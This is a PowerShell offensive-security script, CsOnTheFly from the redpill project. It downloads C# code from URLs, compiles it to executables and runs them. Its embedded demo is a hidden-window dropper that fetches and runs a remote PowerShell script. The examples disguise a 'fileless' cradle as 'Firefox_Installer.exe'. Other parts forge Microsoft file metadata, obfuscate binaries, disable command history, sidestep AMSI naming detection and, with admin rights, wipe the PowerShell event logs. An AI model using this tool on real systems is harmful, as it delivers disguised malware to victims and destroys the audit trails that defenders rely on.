<#
.SYNOPSIS
   Download\Compile\Execute CS scripts On-The-Fly!

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: Microsoft.NET {native}
   Optional Dependencies: Verpatch, Invoke-WebRequest {native}
   PS cmdlet Dev version: v1.4.11

.DESCRIPTION
   This CmdLet downloads\compiles script.cs (To exe) and executes the binary.

.NOTES
   This cmdlet allow users to download CS scripts from network [ -Uri http://script.cs ]
   Or simple to compile an Local CS script into a standalone executable and execute him!

   Remark: Compiling CS scripts using this module will NOT bypass in any way AV detection.
   Remark: URL's must be in RAW format [ https://raw.githubusercontent.com/../script.cs ]

   Remark: Parameter -IconSet '<string'> can be used to add own icon to binary.exe created.
   If invoked -iconset 'true' then cmdlet downloads redpill icon and adds it to binary.exe
   If invoked -iconset 'C:\icon.ico' then cmdlet will use that icon.ico in the binary.exe

   Remark: Parameter -demoscript 'string' its only accessible in -uri 'NonExistingCS.cs'
   Demonstration mode, if you wish to use a diferent cmdlet then manual edit the Program.cs
   Because the main goal of this cmdlet its to download-compile-execute Program.cs from URL

.Parameter Action
   Accepts arguments: compile, execute (default: compile)

.Parameter Uri
   URL of Program.cs to be downloaded OR local Program.cs absoluct \ relative path

.Parameter OutFile
   Standalone executable name to be created plus is absoluct \ relative path

.Parameter IconSet
   Accepts arguments: true, false or icon.ico absoluct path (default: False)

.Parameter FileDescription
   The Compiled standalone executable file description

.Parameter Obfuscate
   Obfuscate the Compiled Executable? (default: false)

.Parameter DemoScript
   https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/test.ps1

.EXAMPLE
   PS C:\> Get-Help .\CsOnTheFly.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Execute
   Create demo script.cs \ compile it to binary.exe and execute him!

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Execute -IconSet True
   Create demonstration script.cs \ compile it to binary.exe and add
   redpill icon.ico to compiled standalone executable and execute him!

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Compile -IconSet "C:\ownicon.ico"
   Create demonstration script.cs \ compile it to binary.exe and add
   ownicon.ico to the compiled standalone executable binary

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Compile -Uri "calc.cs" -OutFile "out.exe"
   Compiles Local -Uri [ calc.cs ] into an standalone executable (dont-execute-exe)

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "calc.cs" -OutFile "out.exe"
   Compiles Local -Uri [ calc.cs ] into an standalone executable and execute it.

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "calc.cs" -OutFile "out.exe" -Obfuscate True
   Compiles Local -Uri [ calc.cs ] into an standalone executable, obfuscate and execute binary.

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "https://raw.github.com/../calc.cs" -OutFile "$Env:TMP\out.exe"
   Downloads -Uri [ URL ] compiles the cs script into an standalone executable and executes the resulting binary.
   Remark: Downloading script.CS from network (https://raw.) will mandatory download them to %tmp% directory!

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Compile -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/CScrandle_fileless.cs" -OutFile "Firefox_Installer.exe"
   Downloads -Uri [ URL ] and compile the cs script into an standalone executable with 'Firefox_Installer.exe' as name on cmdlet working directory

.INPUTS
   None. You cannot pipe objects into CsOnTheFly.ps1

.OUTPUTS
   Compiling SpawnPowershell.cs On-The-Fly!
   ----------------------------------------
   Microsoft.NET   : 4.8.03752
   NETCompiler     : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
   Uri             : https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/CScrandle_fileless.cs
   OutFile         : C:\Users\pedro\AppData\Local\Temp\certreq.exe
   FileDescription : @redpill CS Compiled Executable
   Action          : Execute
   ApplIcon?       : False
   Compiled?       : True

   Directory                         Name          Length CreationTime       
   ---------                         ----          ------ ------------       
   C:\Users\pedro\AppData\Local\Temp certreq.exe   4096 06/04/2021 15:55:40
#>


#Non-Positional cmdlet named parameters!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$demoscript="https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/test.ps1",
   [string]$FileDescription="@redpill CS Compiled Executable",
   [string]$Uri="$Env:TMP\CScrandle_fileless.cs",
   [string]$OutFile="$Env:TMP\certreq.exe",
   [string]$Obfuscate="False",
   [string]$Action="Compile",
   [string]$IconSet="False",
   [string]$Egg="false"
)


$ORIGINALURL = $null
$cmdletversion = "1.4.11"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$Working_Directory = pwd|Select-Object -ExpandProperty Path
$host.UI.RawUI.WindowTitle = "@CsOnTheFly $CmdletVersion {SSA@RedTeam}"


## * [ Compiled StandAlone Executable Icon ] * ##
# If invoked -iconset 'true' then cmdlet downloads @Meterpeter icon and adds it to binary.exe
# If invoked -iconset 'C:\icon.ico' then cmdlet will use that icon.ico in the binary.exe
$RaOuPath = $OutFile.Split('\\')[-1]                       ## certreq.exe
$StrInput = $OutFile -replace "$RaOuPath",""               ## C:\Users\pedro\AppData\Local\Temp\
If($IconSet -ne "False")
{
   If($IconSet -iMatch '\\')
   {
      #User defined Icon
      $IconFile = $IconSet
   }
   Else
   {
      #Redpill default Icon
      $IconFile = "$StrInput" + "myicon.ico" -Join ''      ## C:\Users\pedro\AppData\Local\Temp\myicon.ico
   }
}


## Creates demonstration CS script in the case
# of -URI 'Program.cs' user input its NOT found!
$PSInstallPath = $PsHome ## Store PowerShell path!
#Sets a diferent cmdlet.ps1 to be executed by Program.exe
$ParseCmdLetAgent = $demoscript.Split('/')[-1] #test.ps1

$RawCSScript = @("/*
   Author: @r00t-3xp10it
   redpill v1.2.6 - CsOnTheFly Internal Module!

   Title: StandAlone executable cmdlet download crandle.
   Description: .CS file (to be compiled to standalone executable) that allow users to download\execute external URL's cmdlet

   Dependencies: iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CsOnTheFly.ps1`" -OutFile `"CsOnTheFly.ps1`"
   Compile: .\CsOnTheFly.ps1 -action 'compile' -uri '$Uri' -outfile '$OutFile' -iconset 'true'
*/

using System.Diagnostics;
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           var filePath = @`"$PsHome\powershell.exe`";

           Process process = new Process();
           process.StartInfo.FileName = filePath;
           process.StartInfo.Arguments = `"iwr -Uri $demoscript -OutFile $ParseCmdLetAgent;powershell -File $ParseCmdLetAgent`";
           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
           process.Start();
        }
    }
}")


If($Action -ieq "Compile" -or $Action -ieq "Execute")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - download\compile\execute CS scripts On-The-Fly!

   .EXAMPLE
      PS C:\> .\CsOnTheFly.ps1 -Action Compile -Uri "calc.cs" -OutFile "out.exe"

   .EXAMPLE
      PS C:\> .\CsOnTheFly.ps1 -Action Compile -Uri "calc.cs" -OutFile "out.exe" -IconSet True

   .EXAMPLE
      PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "calc.cs" -OutFile "out.exe" -FileDescription "myapplication"

   .EXAMPLE
      PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "$Env:TMP\calc.cs" -OutFile "$Env:TMP\out.exe" -Obfuscate True

   .EXAMPLE
      PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "https://raw.github.com/../calc.cs" -OutFile "$Env:TMP\out.exe"
   #>


   #Download Program.cs from network URL
   If($Uri -iMatch '^[http(s)]+://')
   {

      If(-not($Uri -iMatch '(.cs)$'))
      {
         #Make sure we are downloading a CS script!
         Write-Host "[error] Bad Uri input: This module only compiles .CS scripts!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "[ url ] Uri: $Uri`n`n" -ForegroundColor Yellow
         exit ## Exit @CsOnTheFly
      }

      If(-not($Uri -iMatch '/raw/' -or $Uri -iMatch 'raw.'))
      {
         #Make sure we are downloading from RAW URL format!
         Write-Host "[error] Bad Uri input: This module only accepts 'raw' URL formats!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "[ url ] https://raw.githubusercontent.com/../script.cs" -ForegroundColor Yellow
         Write-Host "[ url ] https://pastebin.com/raw/../script.cs`n" -ForegroundColor Yellow
         exit ## Exit @CsOnTheFly
      }

      ## Use IWR to download our Program.cs to %tmp% location!
      $StripName = $Uri.Split('/')[-1] ## https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/CScrandle_fileless.cs => CScrandle_fileless.cs
      iwr -Uri "$Uri" -OutFile "${Env:TMP}\${StripName}" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0" -ErrorAction SilentlyContinue|Unblock-File
      $ORIGINALURL = "$Uri";$Uri = "${Env:TMP}\${StripName}" ## Define $Uri variable again!

   }

   #Local Compilation sellected!
   If(-not($Uri -iMatch '(.cs)$'))
   {
      #Make sure we are compiling a CS script!
      Write-Host "[error] Bad Uri input: This module only compiles .CS scripts!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "[ url ] Uri: $Uri`n`n" -ForegroundColor Yellow
      exit ## Exit @CsOnTheFly
   }

   If(-not(Test-Path -Path "$Uri" -EA SilentlyContinue))
   {
      #Program.cs not found => Create demonstration script!
      write-host "[ uri ] '$Uri' Not found, creating demo script!" -ForegroundColor Red -BackgroundColor Black
      echo "$RawCSScript"|Out-File $Uri -encoding ascii -force
   }

   If(Test-Path -Path "$OutFile")
   {
      #Make sure -OutFile does NOT exist!
      $RawFileName = $OutFile.Split('\\')[-1] ## Strip filename from path!
      $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 | Get-Random -Count 8 | %{[char]$_}) ## Random FileName Generation

      Write-Host "[error] OutFile: '$RawFileName' allready exists!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "[ inf ] Renaming OutFile Name to: $Rand.exe" -ForegroundColor Yellow
      $RawFilePath = $OutFile -replace "$RawFileName",""
      $OutFile = "$RawFilePath" + "$Rand.exe" -join ''
   }

   If($OutFile -iMatch '(Payload.exe)$')
   {
      #[error] OutFile Name => ams1 detection!
      $RawFileName = $OutFile.Split('\\')[-1] ## Strp filename from path!
      $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 | Get-Random -Count 8 | %{[char]$_}) ## Random FileName Generation

      Write-Host "[error] OutFile: '$RawFileName' will trigger Ams`i detection!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "[ inf ] Renaming OutFile Name to: $Rand.exe" -ForegroundColor Yellow
      $RawFilePath = $OutFile -replace "$RawFileName",""
      $OutFile = "$RawFilePath" + "$Rand.exe" -join ''
   }


   ## Get Last Microsoft.NET version installed absoluct path
   $LocalCSPath = Get-ChildItem -Path "$Env:WINDIR\Microsoft.NET" -Recurse -EA SilentlyContinue -Force | Where-Object {
      $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '(csc.exe)$' -and $_.FullName -NotMatch '(.config)$'
   }|Select-Object -Last 1 -ExpandProperty FullName 


   ## Compile Program.cs to standalone executable
   # SYNTAX: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /target:winexe /win32icon:icon.ico /out:$OutFile $Uri|Out-Null
   $RegQueryKey = "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"
   $GetNetVersion = (Get-ItemProperty "$RegQueryKey" -EA SilentlyContinue).Version
   If(Test-Path -Path "$LocalCSPath" -EA SilentlyContinue)
   {
      If($IconSet -ieq "True" -or $IconSet -iMatch '\\')
      {
         If(-not(Test-Path -Path "$IconFile" -EA SilentlyContinue))
         {
            #Download icon from @Meterpeter repo => IF does NOT exist!
            iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/meterpeter.ico -OutFile $IconFile -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0" -ErrorAction SilentlyContinue|Unblock-File
         }

         #Compile binary.exe with @redpill icon!
         $CmdLine = "/nologo /target:winexe /win32icon:$IconFile /out:$OutFile $Uri" ## add @Meterpeter icon to binary.exe
      }
      Else
      {
         #Compile binary.exe with windows default icon!
         $CmdLine = "/nologo /target:winexe /out:$OutFile $Uri" ## binary.exe default windows icon!
      }

      $ProcName = "$LocalCSPath"
      ## Use powershell interpreter
      # to execute Microsoft.NET compiler!
      powershell -C $ProcName $CmdLine|Out-Null

   }
   Else
   {
      #[error] Microsoft.NET framework not found!
      Write-Host "[error] Not found Microsoft.NET Compiler! (csc.exe)`n`n" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @Compilecs
   }


   #Check if binary {compiled} exists!
   If((Get-ChildItem -Path "$OutFile" -EA SilentlyContinue).Exists -ieq "True")
   {
      $CompileState = "True"

   }
   Else
   {
      #Fail to compile CS to binary
      $RawErrorName = $OutFile.Split('\\')[-1]
      $CompileState = "Fail to create '$RawErrorName'!"
   }


   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Change Standalone executable description!

   .NOTES
      Required dependencies: Invoke-WebRequest
      Required dependencies: verpatch.exe

   .OUTPUTS
      FileVersion : 1.2.6
      FileName    : Intaller.exe
      Description : @redpill CS Compiled Executable
      ProductName : Microsoft® Windows® Operative System
      Copyright   : ©Microsoft Corporation. All Rights Reserved
   #>


   #Download verpatch.exe from PandoraBox repository!
   If(-not(Test-Path -Path "verpatch.exe" -ErrorAction SilentlyContinue))
   {
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/PandoraBox/master/PandoraBox/FileDescription/verpatch.exe" -OutFile verpatch.exe -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0" -ErrorAction SilentlyContinue|Unblock-File
   }

   $ProDuctName = $OutFile.Split('\\')[-1]
   #Change Compiled Standalone executable file description!
   If(Test-Path -Path "verpatch.exe" -ErrorAction SilentlyContinue)
   {
      .\verpatch.exe /va "$OutFile" "$cmdletversion" /s desc "$FileDescription" /s pb "$cmdletversion" /s product "Microsoft Windows Operative System" /pv "$cmdletversion" /s copyright "Microsoft Corporation. All Rights Reserved" /s OriginalFilename "$ProDuctName"
   }
   Else
   {
      #[error] fail to download verpatch.exe!
      Write-Host "[error] fail to download verpatch.exe!" -ForegroundColor Red -BackgroundColor Black
   }

   
   If($Obfuscate -ieq "True")
   {

      <#
      .SYNOPSIS
         Author: @mkaring|@r00t-3xp10it 
         Helper - Obfuscate .NET applications!

      .NOTES
         Required dependencies: Confuser.CLI.exe {auto-download}
         Remark: ConfuserEx sometimes fail to obfuscate C# sourcecode
         but this function will NOT brake the compiled executable if it fail!
         Remark: Activate $debugging = "True" to debug ConfuserEx while working!

      .EXAMPLE
         PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "$Env:TMP\script.cs" -OutFile "$Env:TMP\Installer.exe" -Obfuscate True
      #>

      $Debugging = "False" ## Manual!
      If(-not($OutFile -Match '\\'))
      {
         $BinaryName = $OutFile
         $ZipDirectory = $Working_Directory

      }
      Else
      {
         #Payloa`d absoluct path sellected!
         $BinaryName = $OutFile.Split('\\')[-1]
         $ZipDirectory = $OutFile -replace "\\$BinaryName",""
      }

      #Download ConfuserEx from my github repository!
      If(-not(Test-Path -Path "$ZipDirectory\ConfuserEx.zip" -ErrorAction SilentlyContinue))
      {
         iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/ConfuserEx.zip" -OutFile "$ZipDirectory\ConfuserEx.zip" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0" -ErrorAction SilentlyContinue|Unblock-File
      }

      If(Test-Path -Path "$ZipDirectory\ConfuserEx.zip" -EA SilentlyContinue)
      {
         cd $ZipDirectory;tar.exe -x -f ConfuserEx.zip|Out-Null
         Write-Host "[ inf ] Obfuscating '$BinaryName' .NET application!" -ForegroundColor Yellow
         Copy-Item -Path "$ZipDirectory\$BinaryName" -Destination "$ZipDirectory\ConfuserEx\$BinaryName" -EA SilentlyContinue -Force|Out-Null

         cd ConfuserEx
         If($Debugging -ieq "True")
         {
            #[debug] Obfuscating .NET applications!
            Write-Host "----------------------------------------------------";Start-Sleep -Seconds 1
            powershell -C .\Confuser.CLI.exe -noPause "$BinaryName" -out "Obfuscated.exe"
            Write-Host "----------------------------------------------------"
         }
         Else
         {
            #[default] Obfuscating .NET applications!
            Start-Process -filepath "Confuser.CLI.exe" -ArgumentList "-noPause `"$BinaryName`" -out `"Obfuscated.exe`""
         }

         #Make sure ConfuserEx has obfuscated the compiled application!
         If(-not(Test-Path -Path "$ZipDirectory\ConfuserEx\Obfuscated.exe" -ErrorAction SilentlyContinue))
         {
            Write-Host "[error] ConfuserEx: fail to obfuscate '${BinaryName}' appl!" -ForegroundColor Red -BackgroundColor Black
            #Remark: Next cmdline stops Confuser.CLI.exe background process if it have fail on is task (hang)!
            Stop-Process -Name "Confuser.CLI" -ErrorAction SilentlyContinue -Force|Out-Null
         }
         Else
         {
            ## Binary successfully obfuscated!
            Move-Item -Path "$ZipDirectory\ConfuserEx\Obfuscated.exe" -Destination "${ZipDirectory}\${BinaryName}" -EA SilentlyContinue -Force
         }
      }

      cd $Working_Directory
      ## Delete all artifacts left behind by this function!
      # Remark: Program.cs and Compiled.exe will remain after cleanning offcourse!
      Remove-Item -Path "$ZipDirectory\ConfuserEx.zip" -EA SilentlyContinue -Force
      Remove-Item -Path "$ZipDirectory\ConfuserEx" -Recurse -EA SilentlyContinue -Force

   }


   If($ORIGINALURL -ne $null)
   {
      $Uri = $ORIGINALURL ## HTTP(S) - https://raw.githubusercontent.com/../calc.cs
      $DispName = $Uri.Split('/')[-1] ## CScrandle_fileless.cs
   }
   ElseIf($Uri -Match '\\')
   {
      $DispName = $Uri.Split('\\')[-1] ## LOCAL - CScrandle_fileless.cs
   }
   ElseIf($Uri -NotMatch '/' -or $Uri -NotMatch '\\')
   {
      $DispName = $Uri ## RELATIVE PATH - CScrandle_fileless.cs
   }

   If($Egg -ieq "False")
   {
      Write-Host "`n`nCompiling $DispName On-The-Fly!" -ForegroundColor Green
      Write-Host "----------------------------------------"
   }

   ## Create Data Table for Output
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("Microsoft.NET")|Out-Null
   $mytable.Columns.Add("NETCompiler")|Out-Null
   $mytable.Columns.Add("Uri")|Out-Null
   $mytable.Columns.Add("OutFile")|Out-Null
   $mytable.Columns.Add("FileDescription")|Out-Null
   $mytable.Columns.Add("Action")|Out-Null
   $mytable.Columns.Add("ApplIcon?")|Out-Null
   $mytable.Columns.Add("Compiled?")|Out-Null
   $mytable.Rows.Add("$GetNetVersion",
                     "$LocalCSPath",
                     "$Uri",          ## <- Accepts: ( http:// | C:\windows | calc.cs ) Path's
                     "$OutFile",
                     "$FileDescription",
                     "$Action",
                     "$IconSet",
                     "$CompileState")|Out-Null

   #Display Output Table
   $mytable|Format-List > $Env:TMP\OutputTable.log
   Get-Content -Path "$Env:TMP\OutputTable.log" | Select-Object -Skip 2 | Select-Object -SkipLast 3


   #Display standalone executable state { Get-ChildItem }
   If(Test-Path -Path "$OutFile" -ErrorAction SilentlyContinue)
   {
      Get-ChildItem -Path "$OutFile" -ErrorAction SilentlyContinue |
         Select-Object Directory,Name,Length,CreationTime | Format-Table -AutoSize
   }

   If($Action -ieq "Execute")
   {
      #Execute the compiled binary!
      Start-Process -FilePath "$OutFile" -EA SilentlyContinue|Out-Null
   }


}
Else
{
   ## [error] Missing cmdlet arguments!
   Write-Host "[error:] Missing cmdlet arguments!" -ForegroundColor Red -BackgroundColor Black
   Write-Host "[syntax] .\CsOnTheFly.ps1 -Action Execute -Uri `"calc.cs`" -OutFile `"out.exe`"`n`n" -ForegroundColor Yellow
}


<#
.SYNOPSIS
   Helper - Delete ALL artifacts left behind!

.NOTES
   This function will delete Bits-Transfer logfiles from eventvwr
   SnapIn if CsOnTheFly its executed with Administrator privileges!
   By default it only deletes @CsOnTheFly cmdlet artifacts left behind! 
#>

If(Test-Path -Path "$Env:TMP\OutputTable.log" -EA SilentlyContinue)
{
   Remove-Item -Path "$Env:TMP\OutputTable.log" -Force
}
If(Test-Path -Path "verpatch.exe" -EA SilentlyContinue)
{
   Remove-Item -Path "verpatch.exe" -Force
}
If($IconSet -ne "False")
{
   If(Test-Path -Path "$IconFile" -EA SilentlyContinue)
   {
      Remove-Item -Path "$IconFile" -Force
   }
}


## Administrator Privileges cleanning! ##
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
If($IsClientAdmin)
{
   #Clean related eventvwr logfiles
   $CleanPSo = (wevtutil gli "Microsoft-Windows-Powershell/Operational" | Where-Object { 
      $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''

   If($CleanPSo -gt 0)
   {
      #Delete ALL Powershell LogFiles
      Write-Host "[+] Eventvwr Powershell/Operational Logs Deleted!" -ForeGroundColor Yellow
      wevtutil cl "Microsoft-Windows-Powershell/Operational" | Out-Null
   }

   $CleanWPS = (wevtutil gli "Windows Powershell" | Where-Object { 
      $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''

   If($CleanWPS -gt 0)
   {
      #Delete ALL Powershell LogFiles
      Write-Host "[+] Eventvwr Windows Powershell Logs Deleted!" -ForeGroundColor Yellow
      wevtutil cl "Windows Powershell" | Out-Null
   }

}
Write-Host ""